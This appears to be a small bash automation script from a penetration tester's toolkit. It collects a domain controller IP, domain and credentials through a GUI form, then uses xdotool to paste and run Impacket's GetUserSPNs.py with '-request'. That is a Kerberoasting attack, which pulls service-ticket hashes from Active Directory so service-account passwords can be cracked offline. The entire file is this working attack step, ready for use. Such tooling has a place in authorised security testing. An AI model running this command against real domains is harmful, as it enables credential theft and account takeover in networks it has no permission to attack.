#!/bin/bash

: '
GetUserSPNs: check for services
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "IP" "Domain" "Username" "Password"

IP=${form_data["IP"]}
DOMAIN=${form_data["Domain"]}
USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}

paste_command "GetUserSPNs.py -dc-ip ${IP} ${DOMAIN}/${USERNAME}:${PASSWORD} -request"
xdotool key Return